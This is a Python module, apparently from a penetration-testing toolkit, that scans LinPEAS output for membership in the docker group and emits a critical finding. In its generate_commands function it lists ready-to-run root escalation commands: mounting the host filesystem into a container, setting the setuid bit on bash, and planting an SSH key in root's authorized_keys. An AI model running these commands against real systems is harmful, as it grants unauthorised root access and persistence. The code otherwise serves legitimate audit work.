"""Detect docker group membership for container escape from LinPEAS output.

Docker group membership alone is sufficient to escape — no socket check needed.
Distinct from docker_sock module which checks for a writable socket file.
"""

import re
from typing import Dict, List

_ID_GROUPS_RE = re.compile(r"groups=([^\s]+)", re.IGNORECASE)
_GROUP_NAME_RE = re.compile(r"\d+\(([^)]+)\)")


def parse_docker_section(section_text: str) -> bool:
    """Return True if the current user belongs to the docker group."""
    for line in section_text.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        m = _ID_GROUPS_RE.search(line)
        if m:
            for name in _GROUP_NAME_RE.findall(m.group(1)):
                if name.lower() == "docker":
                    return True
    return False


def generate_commands() -> List[str]:
    """Generate docker group escape exploit commands."""
    return [
        "docker run --rm -it -v /:/mnt alpine chroot /mnt /bin/sh",
        "docker run --rm -v /:/mnt alpine /bin/sh -c 'chmod +s /mnt/bin/bash'",
        "/bin/bash -p",
        "# Or add SSH key to root:",
        "docker run --rm -v /root:/mnt/root alpine sh -c 'mkdir -p /mnt/root/.ssh && cat >> /mnt/root/.ssh/authorized_keys' <<< \"$(cat ~/.ssh/id_rsa.pub)\"",
    ]


def analyze(section_text: str) -> List[Dict]:
    """Analyze LinPEAS output for docker group membership.

    Returns a single CRITICAL finding if the docker group is detected.
    """
    if not parse_docker_section(section_text):
        return []
    return [
        {
            "group_name": "docker",
            "severity": "CRITICAL",
            "type": "docker_group",
            "description": "current user is in docker group — container escape to root",
            "commands": generate_commands(),
        }
    ]


# ── CLI self-test ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    SAMPLE = "uid=33(www-data) gid=33(www-data) groups=33(www-data),998(docker)\n"
    print("=== analyze ===")
    for f in analyze(SAMPLE):
        print(f"[{f['severity']}] {f['type']} -> {f['description']}")
        print(f"  TRY FIRST: $ {f['commands'][0]}")
